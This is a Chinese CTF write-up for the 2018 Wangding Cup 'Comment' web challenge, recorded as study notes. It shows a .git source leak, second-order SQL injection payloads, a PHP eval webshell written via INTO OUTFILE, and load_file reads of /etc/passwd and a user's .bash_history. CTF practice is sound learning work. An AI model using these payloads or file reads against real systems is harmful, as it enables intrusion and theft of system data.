title:  网鼎杯 2018-Comment  复现笔记
categories: [CTF]
tags: [sql,web,Linux,wp]

---

在家无聊在buu刷到2018网鼎杯的Comment，发现有好几个点正好是的我目前比较薄弱的故写文以记之.<!--more-->

## 0x01过程步骤

、进入题目，发现是一个帖子论坛网站。发现有疑似sql注入的注入点。但是测试后没有发现明显的利用点，就没有什么思绪。尝试访问几个常见文件或目录名，发现有git泄露。

![image-20210215220051579](image-20210215220051579.png)

用githack获得源文件。

![image-20210215222444037](image-20210215222444037.png)

经过审计发现有疑似，二次注入的可能。

![image-20210215222731749](image-20210215222731749.png)



由于addslashes会将一些符号转义但是在sql转义的符号在储存后与addslashes前并没有什么改变（换句话说`\'`在存入sql后，读取出来仍会是`'`）。所有我们可以写入数据，再通过这一特性将`'`逃逸出来，即二次注入。

因此我们可以构造paylaod：

```
a',(select database()),x=1/*

*/
```

但是这题有个坑的地方，审计源码+测试发现只有 content 字段我们才能利用。

所有完整payload：

```
第一包（write.php）
title=2&category=a',content=(select database()),/*&content=111
第二包（comment.php）
content=*/# 
```

这样导致：

```sql
insert into comment
            set category = '$category',
                content = '$content',
                bo_id = '$bo_id'"
```

当$category为`a',content=(select database()),/*`

$content为`*/#`时

sql语句就变成

```sql
insert into comment
            set category = '`a',content=(select database()),/*`',
                content = '*/',
                bo_id = '$bo_id'"
```

从而产生注入。

![image-20210215233502014](image-20210215233502014.png)

但通过注入数据库并未得到什么有效信息。所以猜测是否是写入shell或读取文件。

本想通过`select "<?php eval($_POST[1]);?>" into outfile "/var/www/html/a.php"`写入shell但未能成功。于是同过load_file函数来读取文件。

然后又一个问题来了读取什么文件?

我们尝试读取`flag.php`、`flag.txt`、`/flag`但是发现并未有flag标识。

思路一下就短路了，在查阅了资料后了解到`.bash_history`存放了当前用户历史执行命令。但这个文件在当前用户的目录下。因此我们先要读取`/etc/pass`获取当前用户信息。

![image-20210216000155737](image-20210216000155737.png)

![image-20210216000223139](image-20210216000223139.png)

然后这里有个小知识点一般下www用户是在web服务部署时专门设置来管理web的用户。

读取www用户下的`.bash_history`即访问路径`/home/www/.bash_history`。

![image-20210216000257110](image-20210216000257110.png)

看到linux执行过的命令：

1。跳转到tmp目录

2。用unzip解压 html.zip ，这时会产生一个html的文件夹

3。rm 删除了html.zip 

4。cp 将html 文件夹拷贝在 /var/www 目录下

5。跳转到 /var/html 目录下

6。删除了`.DS_Store`文件

7。启动 web服务

发现在`/var/www/html`下的`.DS_Store`被删除，但是`/tmp`下的`.DS_Store`未被删除。读取发现是2进制文件且带有很多`\00`字符因此用hex转16进制读取。

![image-20210215231823859](image-20210215231823859.png)

再用winhex读取

![image-20210216110435524](image-20210216110435524.png)

发现flag_8946e1ff1ee3e40f.php文件。

在/tmp/html下读取发现是假flag。

在/var/www/html/下读取到真正flag

![image-20210216000357240](image-20210216000357240.png)

## 0x02考点总结

### 1.文件泄露

在本题中考察的是`.git`文件泄露，我们可以利用githack脚本来恢复历史版本和下载git文件。

ps：git log -all 恢复历史文件。

### 2.sql二次注入

在本题中，服务器端只对用传来的数据进行了过滤。sql内部的数据为进行过滤。加之`\'`在存入sql后，读取出来仍会是`'`。这样`‘`就逃逸出来。

### 3.sql文件读取

我们可以同过user()来查看当前用户名，若有读权限那么可以通过load_file函数来读取文件。

同时lunix 下又很多敏感文件，比如：`.bash_history`存放了历史执行命令、/etc/passwd存放了用户信息、/etc/shadow存放用户密码且一般情况下不可读的。

### 4.linux 命令细节

在本题中考了写linux命令的细节，如cp会保留原文件，unzip 解压时默认在当前路径下生成解压出来的文件。

### 5.hexwin 分析hex数据

我们可以将数据转为16进制再通过hexwin写入文件还原从而获得一些内容特别的文件或数据。



## 0x00参考文献

https://www.jb51.net/article/108979.htm

https://www.freebuf.com/articles/web/167089.html

https://blog.csdn.net/qq_41628669/article/details/106133104